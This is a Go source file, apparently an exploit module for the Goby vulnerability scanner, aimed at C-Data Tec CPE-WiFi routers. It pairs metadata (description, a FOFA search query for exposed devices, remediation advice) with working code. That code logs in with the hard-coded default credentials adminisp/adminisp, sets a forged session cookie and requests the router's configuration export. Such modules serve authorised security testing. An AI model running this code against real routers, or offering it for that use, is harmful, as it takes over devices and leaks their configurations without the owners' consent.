package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "C-Data Tec CPE-WiFi Router default password",
    "Description": "<p>C-Data Tec CPE-WiFi Router is a passive optical network client product launched for the broadband access market based on GPON technology.</p><p>Attackers can control the entire platform through default password vulnerabilities and use administrator privileges to operate core functions.</p>",
    "Product": "CPE-WiFi",
    "Homepage": "https://cdatatec.com.cn/",
    "DisclosureDate": "2021-10-26",
    "Author": "featherstark@outlook.com",
    "FofaQuery": "title=\"Wi-Fi Web管理\"",
    "GobyQuery": "title=\"Wi-Fi Web管理\"",
    "Level": "2",
    "Impact": "Attackers can control the entire platform through default password vulnerabilities and use administrator privileges to operate core functions.",
    "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers, and special characters, with more than 8 digits. </p><p>2. If not necessary, prohibit public network access to the system. </p><p>3. Set access policies and whitelist access through security devices such as firewalls. </p>",
    "References": [
        "https://gobies.org/"
    ],
    "Translation": {
        "CN": {
            "Name": "C-Data Tec CPE-WiFi 路由器 默认口令漏洞",
            "Product": "CPE-WiFi",
            "VulType": [
                "默认口令"
            ],
            "Tags": [
                "默认口令"
            ],
            "Description": "<p>C-Data Tec CPE-WiFi 路由器是一款对基于GPON技术的宽带接入市场推出的无源光网络用户端产品。</p><p>C-Data Tec CPE-WiFi 路由器存在默认口令漏洞，攻击者可以通过未经授权的访问漏洞控制整个系统，并最终导致系统处于极不安全的状态。</p>",
            "Impact": "<p>C-Data Tec CPE-WiFi 路由器存在默认口令漏洞，攻击者可以通过未经授权的访问漏洞控制整个系统，并最终导致系统处于极不安全的状态。</p>",
            "Recommendation": "<p>1、修改默认口令，密码最好包含大小写字母、数字和特殊字符等，且位数大于8位。</p><p>2、如非必要，禁止公网访问该系统。</p><p>3、通过防火墙等安全设备设置访问策略，设置白名单访问。</p>"
        },
        "EN": {
            "Name": "C-Data Tec CPE-WiFi Router default password",
            "Product": "CPE-WiFi",
            "VulType": [
                "Default Password"
            ],
            "Tags": [
                "Default Password"
            ],
            "Description": "<p>C-Data Tec CPE-WiFi Router is a passive optical network client product launched for the broadband access market based on GPON technology.</p><p>Attackers can control the entire platform through default password vulnerabilities and use administrator privileges to operate core functions.</p>",
            "Impact": "Attackers can control the entire platform through default password vulnerabilities and use administrator privileges to operate core functions.",
            "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers, and special characters, with more than 8 digits. </p><p>2. If not necessary, prohibit public network access to the system. </p><p>3. Set access policies and whitelist access through security devices such as firewalls. </p>"
        }
    },
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Default Password"
    ],
    "VulType": [
        "Default Password"
    ],
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [],
    "CVSSScore": "5.6",
    "AttackSurfaces": {
        "Application": [
            "CPE-WiFi"
        ],
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10211"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri := "/cgi-bin/login/login_config_save.php"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg.VerifyTls = false
			cfg.Data = "call_function=login&user_login=adminisp&pass_login=adminisp"
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				if resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "2") {
					ss.VulURL = fmt.Sprintf("%s://adminisp:adminisp@%s/cgi-bin/login/login_config_save.php", u.Scheme(), u.HostInfo)
					return true
				}

			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			uri := "/cgi-bin/login/login_config_save.php"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg.VerifyTls = false
			cfg.Data = "call_function=login&user_login=adminisp&pass_login=adminisp"
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "2") {
					configurl := "/cgi-bin/exporteettings.sh"
					cfg := httpclient.NewPostRequestConfig(configurl)
					cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
					cfg.Header.Store("Cookie", "timestamp=1; cooLogin=1; cooUser=adminisp")
					if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
						expResult.Output = resp.Utf8Html
						expResult.Success = true
					}
				}
			}
			return expResult
		},
	))
}
